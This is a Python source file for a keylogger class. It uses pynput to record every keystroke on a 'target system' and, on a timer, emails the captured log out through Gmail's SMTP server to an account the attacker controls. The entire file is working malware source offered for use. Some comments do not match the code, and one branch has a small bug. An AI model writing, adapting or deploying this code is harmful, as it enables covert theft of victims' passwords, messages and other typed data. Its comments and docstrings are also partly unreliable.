#! /usr/bin/python
"""A simple keylogger class.
   Uses Python 2.7.16"""

import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = 'Keylogger started'
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        """Processes the keys pressed on target system, saves them to a file, and then forwards to attacking system."""
        try:
            current_key = str(key.char)
        except AttributeError:          # watches for non-char keys
            if key == key.space:
                current_key = ' '
            else:
                current_key += ' ' + str(key) + ' '
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, '\n\n' + self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)        # pauses for 5 seconds and then calls report function
        timer.start()

    def send_mail(self, email, password, message):
        """Sends email with """
        server = smtplib.SMTP('smtp.gmail.com', 587)  # gmail smtp server address and port
        server.starttls()
        server.login(email, password)  # logs into email account
        server.sendmail(email, email, message)  # sends email from 'email' account to 'email' account
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    # creates an instance of a keyboard listener

        with keyboard_listener:
            self.report()
            keyboard_listener.join()                    # starts listener
